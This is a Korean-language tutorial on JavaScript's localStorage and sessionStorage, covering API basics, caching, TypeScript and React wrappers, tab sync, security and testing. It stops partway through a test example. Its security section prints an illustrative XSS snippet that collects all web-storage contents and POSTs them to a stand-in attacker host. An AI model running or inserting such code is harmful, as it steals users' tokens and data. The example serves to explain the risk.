---
title: "JavaScript Web Storage API 완벽 가이드 - localStorage와 sessionStorage 실전 활용"
description: "JavaScript localStorage와 sessionStorage의 차이점, 타입 안전한 TypeScript 래퍼 구현, 탭 간 동기화, XSS 보안 대책까지 Web Storage API 실무 활용법을 완벽 정리합니다."
date: 2025-12-29 14:00:00 +0900
categories: [Frontend, JavaScript]
tags: [JavaScript, Web-Storage, localStorage, sessionStorage, Browser-API, TypeScript, React, 보안, 캐싱, 상태관리, JSON, XSS, Cookie, IndexedDB, Custom-Hooks, 웹개발]
---

## 개요

웹 애플리케이션에서 클라이언트 측 데이터 저장은 사용자 경험을 향상시키는 핵심 기능입니다. **Web Storage API**는 브라우저에 키-값 쌍을 저장할 수 있는 간단하면서도 강력한 메커니즘을 제공합니다.

이 글에서는 localStorage와 sessionStorage의 차이점부터 타입 안전한 유틸리티 구현, 보안 고려사항까지 실무에서 Web Storage를 효과적으로 활용하는 방법을 다룹니다.

### 학습 목표

- localStorage와 sessionStorage의 특성과 차이점 이해
- Web Storage API의 모든 메서드와 속성 활용법 습득
- 타입 안전한 Storage 래퍼와 React 커스텀 훅 구현
- storage 이벤트를 활용한 탭 간 데이터 동기화 구현
- 보안 취약점을 이해하고 안전한 사용 가이드라인 적용

### 사전 지식

- JavaScript 기초 문법
- [JSON 데이터 포맷](/posts/javascript-json/) 이해
- TypeScript 기초 (고급 패턴 섹션)
- [React Hooks](/posts/react-hooks-performance-optimization/) 기초 (React 훅 섹션)

---

## Web Storage API 소개

### Web Storage란?

Web Storage API는 브라우저에 데이터를 저장하기 위한 메커니즘으로, 두 가지 저장소를 제공합니다.

```javascript
// localStorage - 영구 저장소
localStorage.setItem('username', 'changsu');

// sessionStorage - 세션 저장소
sessionStorage.setItem('sessionId', 'abc123');
```

### localStorage vs sessionStorage

| 특성 | localStorage | sessionStorage |
|------|-------------|----------------|
| 데이터 수명 | 영구적 (직접 삭제 전까지) | 탭/창 닫으면 삭제 |
| 범위 | 같은 출처의 모든 탭/창 공유 | 해당 탭/창에서만 접근 |
| 용량 | 약 5-10MB (브라우저별 상이) | 약 5-10MB (브라우저별 상이) |
| 이벤트 | storage 이벤트 발생 | storage 이벤트 발생 |
| 서버 전송 | 자동 전송되지 않음 | 자동 전송되지 않음 |

### Cookie와의 비교

Web Storage가 등장하기 전에는 Cookie가 클라이언트 측 데이터 저장의 유일한 방법이었습니다.

| 특성 | Web Storage | Cookie |
|------|-------------|--------|
| 용량 | 5-10MB | 4KB |
| 서버 전송 | 자동 전송 안 됨 | 모든 HTTP 요청에 자동 포함 |
| 만료 시간 | localStorage: 없음, sessionStorage: 세션 종료 | 설정 가능 (Expires, Max-Age) |
| 접근 방법 | JavaScript API | JavaScript + HTTP 헤더 |
| httpOnly | 지원 안 함 | 지원 (XSS 방어) |
| 보안 | XSS에 취약 | httpOnly로 보호 가능 |

> Web Storage는 Cookie와 달리 HTTP 요청에 자동으로 포함되지 않아 네트워크 트래픽을 줄일 수 있습니다. 하지만 httpOnly 옵션이 없어 XSS 공격에 더 취약합니다.
{: .prompt-info }

### 브라우저 지원 및 용량 제한

```javascript
// Web Storage 지원 여부 확인
function isStorageAvailable(type) {
  try {
    const storage = window[type];
    const testKey = '__storage_test__';
    storage.setItem(testKey, testKey);
    storage.removeItem(testKey);
    return true;
  } catch (e) {
    return (
      e instanceof DOMException &&
      e.name === 'QuotaExceededError' &&
      // Firefox에서는 쿠키 비활성화 시 예외 발생
      storage &&
      storage.length !== 0
    );
  }
}

// 사용 예시
if (isStorageAvailable('localStorage')) {
  console.log('localStorage 사용 가능');
} else {
  console.log('localStorage 사용 불가 - 대체 수단 필요');
}
```

브라우저별 Storage 용량 제한:

| 브라우저 | localStorage | sessionStorage |
|----------|-------------|----------------|
| Chrome | 10MB | 10MB |
| Firefox | 10MB | 10MB |
| Safari | 5MB | 5MB |
| Edge | 10MB | 10MB |
| IE 11 | 5MB | 5MB |

---

## 기본 API 사용법

### setItem() - 데이터 저장

```javascript
// 문자열 저장
localStorage.setItem('username', 'changsu');
localStorage.setItem('theme', 'dark');

// 숫자도 문자열로 저장됨
localStorage.setItem('visitCount', '42');

// sessionStorage도 동일한 방식
sessionStorage.setItem('currentPage', '/dashboard');
```

### getItem() - 데이터 조회

```javascript
// 데이터 조회
const username = localStorage.getItem('username');
console.log(username); // 'changsu'

// 존재하지 않는 키는 null 반환
const nonExistent = localStorage.getItem('nonExistentKey');
console.log(nonExistent); // null

// null 체크와 기본값 처리
const theme = localStorage.getItem('theme') ?? 'light';
```

### removeItem() - 특정 데이터 삭제

```javascript
// 특정 키 삭제
localStorage.removeItem('username');

// 삭제 후 조회하면 null
console.log(localStorage.getItem('username')); // null

// 존재하지 않는 키 삭제해도 에러 없음
localStorage.removeItem('nonExistentKey'); // 에러 발생 안 함
```

### clear() - 모든 데이터 삭제

```javascript
// localStorage의 모든 데이터 삭제
localStorage.clear();

// sessionStorage의 모든 데이터 삭제
sessionStorage.clear();
```

> `clear()`는 해당 출처(origin)의 모든 데이터를 삭제합니다. 실수로 호출하면 복구할 수 없으니 주의하세요.
{: .prompt-warning }

### key()와 length - 저장소 순회

```javascript
// 저장된 항목 수 확인
console.log(localStorage.length); // 예: 3

// 인덱스로 키 조회
const firstKey = localStorage.key(0);
console.log(firstKey); // 예: 'username'

// 모든 키-값 쌍 순회
function getAllStorageItems(storage) {
  const items = {};
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    items[key] = storage.getItem(key);
  }
  return items;
}

console.log(getAllStorageItems(localStorage));
// { username: 'changsu', theme: 'dark', visitCount: '42' }
```

### JSON 직렬화/역직렬화

Web Storage는 문자열만 저장할 수 있으므로, 객체나 배열은 JSON으로 변환해야 합니다.

```javascript
// 객체 저장
const user = {
  id: 1,
  name: '창수',
  preferences: {
    theme: 'dark',
    language: 'ko'
  }
};

localStorage.setItem('user', JSON.stringify(user));

// 객체 조회
const storedUser = JSON.parse(localStorage.getItem('user'));
console.log(storedUser.name); // '창수'
console.log(storedUser.preferences.theme); // 'dark'

// 배열 저장
const recentSearches = ['React', 'TypeScript', 'Next.js'];
localStorage.setItem('searches', JSON.stringify(recentSearches));

// 배열 조회
const searches = JSON.parse(localStorage.getItem('searches'));
console.log(searches[0]); // 'React'
```

안전한 JSON 파싱 함수:

```javascript
function safeJSONParse(jsonString, fallback = null) {
  if (jsonString === null) {
    return fallback;
  }

  try {
    return JSON.parse(jsonString);
  } catch (error) {
    console.error('JSON 파싱 실패:', error);
    return fallback;
  }
}

// 사용 예시
const user = safeJSONParse(localStorage.getItem('user'), { name: 'Guest' });
const searches = safeJSONParse(localStorage.getItem('searches'), []);
```

---

## 실전 활용 패턴

### 사용자 설정 저장 (다크 모드, 언어 설정)

```javascript
// 테마 설정 관리
const ThemeManager = {
  STORAGE_KEY: 'app-theme',

  getTheme() {
    return localStorage.getItem(this.STORAGE_KEY) || 'system';
  },

  setTheme(theme) {
    localStorage.setItem(this.STORAGE_KEY, theme);
    this.applyTheme(theme);
  },

  applyTheme(theme) {
    const root = document.documentElement;

    if (theme === 'system') {
      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
      theme = prefersDark ? 'dark' : 'light';
    }

    root.setAttribute('data-theme', theme);
  },

  init() {
    // 저장된 테마 적용
    this.applyTheme(this.getTheme());

    // 시스템 테마 변경 감지
    window.matchMedia('(prefers-color-scheme: dark)')
      .addEventListener('change', (e) => {
        if (this.getTheme() === 'system') {
          this.applyTheme('system');
        }
      });
  }
};

// 초기화
ThemeManager.init();

// 테마 변경
ThemeManager.setTheme('dark');
```

### 폼 데이터 자동 저장

사용자가 작성 중인 폼 데이터를 자동으로 저장하여 실수로 페이지를 떠나도 복구할 수 있게 합니다.

```javascript
class FormAutoSave {
  constructor(formId, storageKey) {
    this.form = document.getElementById(formId);
    this.storageKey = storageKey;
    this.debounceTimer = null;

    this.init();
  }

  init() {
    // 저장된 데이터 복원
    this.restore();

    // 입력 이벤트 리스너 등록 (디바운스 적용)
    this.form.addEventListener('input', () => {
      this.debouncedSave();
    });

    // 폼 제출 시 저장된 데이터 삭제
    this.form.addEventListener('submit', () => {
      this.clear();
    });

    // 페이지 이탈 전 저장
    window.addEventListener('beforeunload', () => {
      this.save();
    });
  }

  debouncedSave() {
    clearTimeout(this.debounceTimer);
    this.debounceTimer = setTimeout(() => {
      this.save();
    }, 500);
  }

  save() {
    const formData = new FormData(this.form);
    const data = {};

    formData.forEach((value, key) => {
      // 비밀번호는 저장하지 않음
      if (!key.toLowerCase().includes('password')) {
        data[key] = value;
      }
    });

    data._savedAt = Date.now();
    sessionStorage.setItem(this.storageKey, JSON.stringify(data));
  }

  restore() {
    const savedData = sessionStorage.getItem(this.storageKey);
    if (!savedData) return;

    try {
      const data = JSON.parse(savedData);

      // 24시간이 지난 데이터는 삭제
      if (Date.now() - data._savedAt > 24 * 60 * 60 * 1000) {
        this.clear();
        return;
      }

      // 폼 필드 복원
      Object.entries(data).forEach(([key, value]) => {
        if (key === '_savedAt') return;

        const field = this.form.elements[key];
        if (field) {
          field.value = value;
        }
      });

      console.log('폼 데이터가 복원되었습니다.');
    } catch (error) {
      console.error('폼 데이터 복원 실패:', error);
    }
  }

  clear() {
    sessionStorage.removeItem(this.storageKey);
  }
}

// 사용 예시
const autoSave = new FormAutoSave('contact-form', 'contact-form-draft');
```

### API 응답 캐싱

네트워크 요청을 줄이고 성능을 향상시키기 위한 캐싱 전략입니다.

```javascript
class CacheManager {
  constructor(options = {}) {
    this.prefix = options.prefix || 'cache_';
    this.defaultTTL = options.ttl || 5 * 60 * 1000; // 기본 5분
    this.storage = options.storage || localStorage;
  }

  generateKey(key) {
    return `${this.prefix}${key}`;
  }

  set(key, data, ttl = this.defaultTTL) {
    const cacheEntry = {
      data,
      expiry: Date.now() + ttl,
      createdAt: Date.now()
    };

    try {
      this.storage.setItem(
        this.generateKey(key),
        JSON.stringify(cacheEntry)
      );
      return true;
    } catch (error) {
      // 용량 초과 시 오래된 캐시 정리 후 재시도
      if (error.name === 'QuotaExceededError') {
        this.cleanup();
        try {
          this.storage.setItem(
            this.generateKey(key),
            JSON.stringify(cacheEntry)
          );
          return true;
        } catch {
          return false;
        }
      }
      return false;
    }
  }

  get(key) {
    const raw = this.storage.getItem(this.generateKey(key));
    if (!raw) return null;

    try {
      const cacheEntry = JSON.parse(raw);

      // 만료 확인
      if (Date.now() > cacheEntry.expiry) {
        this.remove(key);
        return null;
      }

      return cacheEntry.data;
    } catch {
      return null;
    }
  }

  remove(key) {
    this.storage.removeItem(this.generateKey(key));
  }

  cleanup() {
    const keysToRemove = [];

    for (let i = 0; i < this.storage.length; i++) {
      const key = this.storage.key(i);
      if (key.startsWith(this.prefix)) {
        const raw = this.storage.getItem(key);
        try {
          const entry = JSON.parse(raw);
          if (Date.now() > entry.expiry) {
            keysToRemove.push(key);
          }
        } catch {
          keysToRemove.push(key);
        }
      }
    }

    keysToRemove.forEach(key => this.storage.removeItem(key));
    console.log(`${keysToRemove.length}개의 만료된 캐시 항목 삭제됨`);
  }

  // 캐시 우선 전략으로 데이터 가져오기
  async getOrFetch(key, fetchFn, ttl) {
    // 캐시 확인
    const cached = this.get(key);
    if (cached !== null) {
      console.log(`캐시 히트: ${key}`);
      return cached;
    }

    // 캐시 없으면 fetch
    console.log(`캐시 미스: ${key}`);
    const data = await fetchFn();
    this.set(key, data, ttl);
    return data;
  }
}

// 사용 예시
const cache = new CacheManager({ ttl: 10 * 60 * 1000 }); // 10분

async function getUsers() {
  return cache.getOrFetch('users', async () => {
    const response = await fetch('/api/users');
    return response.json();
  });
}
```

### 인증 토큰 저장 (주의사항 포함)

```javascript
// 권장하지 않는 방식 - XSS에 취약
localStorage.setItem('accessToken', 'eyJhbGciOiJIUzI1NiIs...');

// 상대적으로 안전한 방식 - 메모리에 저장
class TokenManager {
  #accessToken = null;

  setToken(token) {
    this.#accessToken = token;
    // Refresh token만 localStorage에 저장 (또는 httpOnly cookie 권장)
  }

  getToken() {
    return this.#accessToken;
  }

  clearToken() {
    this.#accessToken = null;
    localStorage.removeItem('refreshToken');
  }

  // 페이지 새로고침 시 토큰 복구
  async refreshAccessToken() {
    const refreshToken = localStorage.getItem('refreshToken');
    if (!refreshToken) return null;

    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ refreshToken })
      });

      if (!response.ok) throw new Error('Token refresh failed');

      const { accessToken } = await response.json();
      this.#accessToken = accessToken;
      return accessToken;
    } catch (error) {
      this.clearToken();
      return null;
    }
  }
}
```

> 민감한 인증 토큰을 localStorage에 저장하는 것은 보안상 권장되지 않습니다. Access Token은 메모리에, Refresh Token은 httpOnly Cookie에 저장하는 것이 더 안전합니다.
{: .prompt-danger }

---

## 고급 패턴

### 타입 안전한 Storage Wrapper (TypeScript)

```typescript
// 저장할 데이터의 스키마 정의
interface StorageSchema {
  user: {
    id: number;
    name: string;
    email: string;
  };
  preferences: {
    theme: 'light' | 'dark' | 'system';
    language: string;
    notifications: boolean;
  };
  recentSearches: string[];
  lastVisit: number;
}

// 타입 안전한 Storage 래퍼
class TypedStorage<T extends Record<string, unknown>> {
  constructor(private storage: Storage = localStorage) {}

  get<K extends keyof T>(key: K): T[K] | null {
    const item = this.storage.getItem(key as string);
    if (item === null) return null;

    try {
      return JSON.parse(item) as T[K];
    } catch {
      return null;
    }
  }

  set<K extends keyof T>(key: K, value: T[K]): void {
    this.storage.setItem(key as string, JSON.stringify(value));
  }

  remove<K extends keyof T>(key: K): void {
    this.storage.removeItem(key as string);
  }

  // 부분 업데이트 (객체인 경우)
  update<K extends keyof T>(
    key: K,
    updater: T[K] extends object ? Partial<T[K]> : T[K]
  ): void {
    const current = this.get(key);

    if (current === null) {
      this.set(key, updater as T[K]);
      return;
    }

    if (typeof current === 'object' && !Array.isArray(current)) {
      this.set(key, { ...current, ...updater } as T[K]);
    } else {
      this.set(key, updater as T[K]);
    }
  }

  has<K extends keyof T>(key: K): boolean {
    return this.storage.getItem(key as string) !== null;
  }
}

// 사용 예시
const storage = new TypedStorage<StorageSchema>();

// 타입 안전하게 데이터 저장/조회
storage.set('user', { id: 1, name: '창수', email: 'changsu@example.com' });
storage.set('preferences', { theme: 'dark', language: 'ko', notifications: true });
storage.set('recentSearches', ['React', 'TypeScript']);

// 자동 완성과 타입 검증
const user = storage.get('user'); // { id: number; name: string; email: string } | null
const theme = storage.get('preferences')?.theme; // 'light' | 'dark' | 'system' | undefined

// 부분 업데이트
storage.update('preferences', { theme: 'light' });

// 컴파일 에러 발생
// storage.set('user', { wrongKey: 'value' }); // Error!
// storage.set('preferences', { theme: 'invalid' }); // Error!
```

### 만료 기능 구현

```typescript
interface StorageItemWithExpiry<T> {
  value: T;
  expiry: number | null; // null이면 만료 없음
}

class ExpiringStorage {
  constructor(private storage: Storage = localStorage) {}

  set<T>(key: string, value: T, ttlMs?: number): void {
    const item: StorageItemWithExpiry<T> = {
      value,
      expiry: ttlMs ? Date.now() + ttlMs : null
    };
    this.storage.setItem(key, JSON.stringify(item));
  }

  get<T>(key: string): T | null {
    const itemStr = this.storage.getItem(key);
    if (!itemStr) return null;

    try {
      const item: StorageItemWithExpiry<T> = JSON.parse(itemStr);

      // 만료 확인
      if (item.expiry !== null && Date.now() > item.expiry) {
        this.storage.removeItem(key);
        return null;
      }

      return item.value;
    } catch {
      return null;
    }
  }

  // 남은 TTL 확인 (밀리초)
  getTTL(key: string): number | null {
    const itemStr = this.storage.getItem(key);
    if (!itemStr) return null;

    try {
      const item: StorageItemWithExpiry<unknown> = JSON.parse(itemStr);

      if (item.expiry === null) return Infinity;

      const remaining = item.expiry - Date.now();
      return remaining > 0 ? remaining : null;
    } catch {
      return null;
    }
  }

  // TTL 갱신
  touch(key: string, ttlMs: number): boolean {
    const value = this.get(key);
    if (value === null) return false;

    this.set(key, value, ttlMs);
    return true;
  }
}

// 사용 예시
const expiringStorage = new ExpiringStorage();

// 1시간 후 만료
expiringStorage.set('session', { userId: 1 }, 60 * 60 * 1000);

// 30초 후 만료
expiringStorage.set('otp', '123456', 30 * 1000);

// 만료되지 않은 데이터만 반환
const session = expiringStorage.get('session');

// 남은 시간 확인
const remainingMs = expiringStorage.getTTL('session');
console.log(`남은 시간: ${Math.floor(remainingMs / 1000)}초`);
```

### storage 이벤트를 활용한 탭 간 동기화

여러 탭에서 같은 애플리케이션을 열었을 때 상태를 동기화하는 패턴입니다.

```javascript
// 탭 간 상태 동기화 관리자
class CrossTabSync {
  constructor() {
    this.listeners = new Map();
    this.init();
  }

  init() {
    // storage 이벤트는 변경을 발생시킨 탭에서는 발생하지 않음
    window.addEventListener('storage', (event) => {
      if (!event.key) return; // clear() 호출 시

      const callback = this.listeners.get(event.key);
      if (callback) {
        const newValue = event.newValue ? JSON.parse(event.newValue) : null;
        const oldValue = event.oldValue ? JSON.parse(event.oldValue) : null;
        callback(newValue, oldValue, event);
      }
    });
  }

  subscribe(key, callback) {
    this.listeners.set(key, callback);

    // 구독 해제 함수 반환
    return () => {
      this.listeners.delete(key);
    };
  }

  // 현재 탭에서도 리스너 호출이 필요한 경우
  setWithNotify(key, value) {
    const oldValue = localStorage.getItem(key);
    localStorage.setItem(key, JSON.stringify(value));

    // 현재 탭의 리스너도 호출
    const callback = this.listeners.get(key);
    if (callback) {
      callback(
        value,
        oldValue ? JSON.parse(oldValue) : null,
        { key, newValue: JSON.stringify(value), oldValue }
      );
    }
  }
}

// 사용 예시
const crossTabSync = new CrossTabSync();

// 테마 변경 동기화
crossTabSync.subscribe('theme', (newTheme, oldTheme) => {
  console.log(`테마 변경: ${oldTheme} -> ${newTheme}`);
  document.documentElement.setAttribute('data-theme', newTheme);
});

// 로그아웃 동기화
crossTabSync.subscribe('user', (newUser, oldUser) => {
  if (oldUser && !newUser) {
    // 다른 탭에서 로그아웃됨
    alert('다른 탭에서 로그아웃되었습니다.');
    window.location.href = '/login';
  }
});

// 장바구니 동기화
crossTabSync.subscribe('cart', (newCart, oldCart) => {
  updateCartUI(newCart);
});
```

### Storage 유틸리티 훅 (React)

React에서 localStorage를 활용한 커스텀 훅 패턴입니다. 더 다양한 커스텀 훅 패턴은 [React Custom Hooks 패턴 가이드](/posts/react-custom-hooks-patterns-guide/)에서 확인할 수 있습니다.

```tsx
import { useState, useEffect, useCallback } from 'react';

// useLocalStorage 훅
function useLocalStorage<T>(
  key: string,
  initialValue: T
): [T, (value: T | ((prev: T) => T)) => void, () => void] {
  // 초기값 가져오기
  const readValue = useCallback((): T => {
    if (typeof window === 'undefined') {
      return initialValue;
    }

    try {
      const item = window.localStorage.getItem(key);
      return item ? (JSON.parse(item) as T) : initialValue;
    } catch (error) {
      console.warn(`localStorage 읽기 오류 (key: ${key}):`, error);
      return initialValue;
    }
  }, [key, initialValue]);

  const [storedValue, setStoredValue] = useState<T>(readValue);

  // 값 설정 함수
  const setValue = useCallback(
    (value: T | ((prev: T) => T)) => {
      try {
        const valueToStore = value instanceof Function
          ? value(storedValue)
          : value;

        setStoredValue(valueToStore);

        if (typeof window !== 'undefined') {
          window.localStorage.setItem(key, JSON.stringify(valueToStore));

          // 같은 탭의 다른 컴포넌트에도 알림
          window.dispatchEvent(new StorageEvent('storage', {
            key,
            newValue: JSON.stringify(valueToStore)
          }));
        }
      } catch (error) {
        console.warn(`localStorage 쓰기 오류 (key: ${key}):`, error);
      }
    },
    [key, storedValue]
  );

  // 값 삭제 함수
  const removeValue = useCallback(() => {
    try {
      if (typeof window !== 'undefined') {
        window.localStorage.removeItem(key);
        setStoredValue(initialValue);
      }
    } catch (error) {
      console.warn(`localStorage 삭제 오류 (key: ${key}):`, error);
    }
  }, [key, initialValue]);

  // 다른 탭에서의 변경 감지
  useEffect(() => {
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === key && event.newValue !== null) {
        setStoredValue(JSON.parse(event.newValue));
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, [key]);

  return [storedValue, setValue, removeValue];
}

// useSessionStorage 훅
function useSessionStorage<T>(
  key: string,
  initialValue: T
): [T, (value: T | ((prev: T) => T)) => void] {
  const [storedValue, setStoredValue] = useState<T>(() => {
    if (typeof window === 'undefined') return initialValue;

    try {
      const item = window.sessionStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch {
      return initialValue;
    }
  });

  const setValue = (value: T | ((prev: T) => T)) => {
    try {
      const valueToStore = value instanceof Function
        ? value(storedValue)
        : value;
      setStoredValue(valueToStore);
      window.sessionStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.warn(`sessionStorage 오류:`, error);
    }
  };

  return [storedValue, setValue];
}

// 사용 예시
function App() {
  const [theme, setTheme, removeTheme] = useLocalStorage('theme', 'light');
  const [user, setUser] = useLocalStorage('user', null);
  const [sessionData, setSessionData] = useSessionStorage('session', {});

  return (
    <div data-theme={theme}>
      <button onClick={() => setTheme(t => t === 'light' ? 'dark' : 'light')}>
        테마 전환
      </button>
      <button onClick={removeTheme}>
        테마 초기화
      </button>
    </div>
  );
}
```

---

## 보안 고려사항

Web Storage의 보안 취약점과 대응 방안을 다룹니다. 프론트엔드 보안에 대한 더 자세한 내용은 [프론트엔드 보안 가이드](/posts/frontend-security-guide/)를 참고하세요.

### XSS 취약점과 민감 데이터

Web Storage는 JavaScript로 접근 가능하므로 XSS(Cross-Site Scripting) 공격에 취약합니다.

```javascript
// 공격자가 XSS를 통해 실행하는 악성 코드
const stolenData = {
  localStorage: { ...localStorage },
  sessionStorage: { ...sessionStorage }
};

// 공격자 서버로 전송
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(stolenData)
});
```

### 민감 데이터 저장 가이드라인

| 데이터 유형 | localStorage | sessionStorage | httpOnly Cookie | 권장 |
|------------|-------------|----------------|-----------------|------|
| Access Token | X | X | O | httpOnly Cookie |
| Refresh Token | X | X | O | httpOnly Cookie |
| 사용자 설정 | O | - | - | localStorage |
| 세션 데이터 | - | O | - | sessionStorage |
| 민감한 개인정보 | X | X | X | 서버에만 저장 |

### 안전한 사용 가이드라인

```javascript
// 1. 민감한 데이터 저장 전 검증
function isSensitiveData(key) {
  const sensitivePatterns = [
    /token/i,
    /password/i,
    /secret/i,
    /credit.*card/i,
    /ssn/i
  ];
  return sensitivePatterns.some(pattern => pattern.test(key));
}

function safeSetItem(key, value) {
  if (isSensitiveData(key)) {
    console.warn(`보안 경고: "${key}"는 민감한 데이터로 보입니다.`);
    // 실제로는 저장하지 않거나 암호화 적용
    return false;
  }
  localStorage.setItem(key, value);
  return true;
}

// 2. 입력 값 검증 (저장 전)
function sanitizeForStorage(data) {
  if (typeof data === 'string') {
    // HTML 태그 제거
    return data.replace(/<[^>]*>/g, '');
  }
  if (typeof data === 'object') {
    return JSON.stringify(data);
  }
  return String(data);
}

// 3. CSP(Content Security Policy) 헤더 설정 권장
// 서버에서 설정: Content-Security-Policy: script-src 'self'
```

### httpOnly Cookie와의 비교

```javascript
// localStorage - XSS에 취약
localStorage.setItem('token', 'secret_token'); // JavaScript로 접근 가능

// httpOnly Cookie - XSS에 안전
// 서버에서 Set-Cookie 헤더로 설정
// Set-Cookie: token=secret_token; HttpOnly; Secure; SameSite=Strict

// JavaScript에서 httpOnly 쿠키 접근 불가
document.cookie; // httpOnly 쿠키는 표시되지 않음
```

> 인증 관련 토큰은 반드시 httpOnly Cookie를 사용하세요. Web Storage는 사용자 설정이나 비민감 캐시 데이터에만 사용하는 것이 좋습니다.
{: .prompt-tip }

---

## 성능 최적화

Web Storage 사용 시 성능 고려사항을 다룹니다. JavaScript 메모리 관리에 대한 심화 내용은 [JavaScript 메모리 관리와 가비지 컬렉션 가이드](/posts/javascript-memory-management-garbage-collection-guide/)를 참고하세요.

### 동기 API의 특성 이해

Web Storage API는 **동기적**으로 동작합니다. 이는 메인 스레드를 블로킹할 수 있다는 의미입니다.

```javascript
// 동기 API - 메인 스레드 블로킹
console.time('localStorage');
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`key${i}`, `value${i}`);
}
console.timeEnd('localStorage'); // 수십 밀리초 소요 가능

// 대용량 데이터 저장 시 UI 프리징 발생 가능
localStorage.setItem('largeData', JSON.stringify(hugeObject)); // 블로킹!
```

### 대용량 데이터 처리 전략

```javascript
// 1. 청크 분할 저장
class ChunkedStorage {
  constructor(key, chunkSize = 100 * 1024) { // 100KB 청크
    this.key = key;
    this.chunkSize = chunkSize;
  }

  set(data) {
    const jsonStr = JSON.stringify(data);
    const chunks = [];

    for (let i = 0; i < jsonStr.length; i += this.chunkSize) {
      chunks.push(jsonStr.slice(i, i + this.chunkSize));
    }

    // 메타데이터 저장
    localStorage.setItem(`${this.key}_meta`, JSON.stringify({
      chunks: chunks.length,
      totalSize: jsonStr.length
    }));

    // 청크 저장
    chunks.forEach((chunk, index) => {
      localStorage.setItem(`${this.key}_${index}`, chunk);
    });
  }

  get() {
    const metaStr = localStorage.getItem(`${this.key}_meta`);
    if (!metaStr) return null;

    const meta = JSON.parse(metaStr);
    let jsonStr = '';

    for (let i = 0; i < meta.chunks; i++) {
      jsonStr += localStorage.getItem(`${this.key}_${i}`);
    }

    return JSON.parse(jsonStr);
  }

  remove() {
    const metaStr = localStorage.getItem(`${this.key}_meta`);
    if (!metaStr) return;

    const meta = JSON.parse(metaStr);

    for (let i = 0; i < meta.chunks; i++) {
      localStorage.removeItem(`${this.key}_${i}`);
    }
    localStorage.removeItem(`${this.key}_meta`);
  }
}

// 2. 비동기 처리 (requestIdleCallback 활용)
async function setItemAsync(key, value) {
  return new Promise((resolve) => {
    requestIdleCallback(() => {
      localStorage.setItem(key, JSON.stringify(value));
      resolve();
    });
  });
}

// 3. Web Worker에서 처리 (IndexedDB 권장)
// localStorage는 Web Worker에서 접근 불가
// 대용량 데이터는 IndexedDB 사용 권장
```

### 압축 저장 전략

```javascript
// LZ-String 라이브러리 활용 (CDN: https://pieroxy.net/blog/pages/lz-string/index.html)
// npm install lz-string

import LZString from 'lz-string';

class CompressedStorage {
  static set(key, data) {
    const jsonStr = JSON.stringify(data);
    const compressed = LZString.compressToUTF16(jsonStr);

    console.log(`압축률: ${((1 - compressed.length / jsonStr.length) * 100).toFixed(1)}%`);

    localStorage.setItem(key, compressed);
  }

  static get(key) {
    const compressed = localStorage.getItem(key);
    if (!compressed) return null;

    const jsonStr = LZString.decompressFromUTF16(compressed);
    return JSON.parse(jsonStr);
  }
}

// 사용 예시
const largeData = { /* 대용량 객체 */ };
CompressedStorage.set('compressed-data', largeData);
const restored = CompressedStorage.get('compressed-data');
```

### 성능 측정 결과

실제 측정 결과 (Chrome, 1000개 항목 기준):

| 작업 | 소요 시간 |
|------|----------|
| setItem (단일) | ~0.1ms |
| setItem (1000회 반복) | ~50-100ms |
| getItem (단일) | ~0.05ms |
| JSON.stringify (1MB) | ~10-20ms |
| 압축 저장 (1MB) | ~30-50ms (압축률 60-80%) |

---

## 디버깅 및 테스트

### DevTools 활용법

Chrome DevTools에서 Storage를 확인하고 조작하는 방법입니다.

1. **Application 탭 열기**: F12 또는 Cmd+Option+I -> Application 탭
2. **Storage 확인**: 좌측 패널에서 Local Storage 또는 Session Storage 선택
3. **데이터 조작**:
   - 더블클릭으로 값 편집
   - 우클릭으로 삭제
   - 상단 필터로 검색

```javascript
// 콘솔에서 Storage 디버깅
// 모든 localStorage 항목 출력
console.table({ ...localStorage });

// 특정 키 검색
Object.keys(localStorage)
  .filter(key => key.includes('user'))
  .forEach(key => console.log(key, localStorage.getItem(key)));

// Storage 용량 확인
function getStorageSize(storage) {
  let total = 0;
  for (let key in storage) {
    if (storage.hasOwnProperty(key)) {
      total += (key.length + storage.getItem(key).length) * 2; // UTF-16
    }
  }
  return (total / 1024).toFixed(2) + ' KB';
}

console.log('localStorage 사용량:', getStorageSize(localStorage));
```

### Jest에서 localStorage 모킹

```javascript
// setupTests.js 또는 테스트 파일 상단
const localStorageMock = (() => {
  let store = {};

  return {
    getItem: jest.fn((key) => store[key] ?? null),
    setItem: jest.fn((key, value) => {
      store[key] = String(value);
    }),
    removeItem: jest.fn((key) => {
      delete store[key];
    }),
    clear: jest.fn(() => {
      store = {};
    }),
    get length() {
      return Object.keys(store).length;
    },
    key: jest.fn((index) => Object.keys(store)[index] ?? null)
  };
})();

Object.defineProperty(window, 'localStorage', {
  value: localStorageMock
});

// 테스트 예시
describe('UserSettings', () => {
  beforeEach(() => {
    localStorage.clear();
    jest.clearAllMocks();
  });

  test('테마 설정이 localStorage에 저장되어야 한다', () => {
    const settings = new UserSettings();
    settings.setTheme('dark');

    expect(localStorage.setItem).toHaveBeenCalledWith(
      'theme',
      JSON.stringify('dark')
    );
  });

  test('저장된 테마를 불러와야 한다', () => {
    localStorage.setItem('theme', JSON.stringify('dark'));

    const settings = new UserSettings();
    expect(settings.getTheme()).toBe('dark');
  });

  test('저장된 값이 없으면 기본값을 반환해야 한다', () => {
    const settings = new UserSettings();
    expect(settings.getTheme()).toBe('light'); // 기본값
  });
});
```

### React Testing Library에서 테스트

```tsx
import { render, screen, fireEvent } from '@testing-library/react';
import { ThemeProvider } from './ThemeProvider';

// localStorage 모킹
const mockLocalStorage = (() => {
  let store: Record<string, string> = {};
  return {
    getItem: (key: string) => store[key] ?? null,
    setItem: (key: string, value: string) => { store[key] = value; },
    removeItem: (key: string) => { delete store[key]; },
    clear: () => { store = {}; }
  };
})();

Object.defineProperty(window, 'localStorage', { value: mockLocalStorage });

describe('ThemeProvider', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  test('테마 토글 버튼이 테마를 변경하고 저장해야 한다', () => {
    render(
      <ThemeProvider>
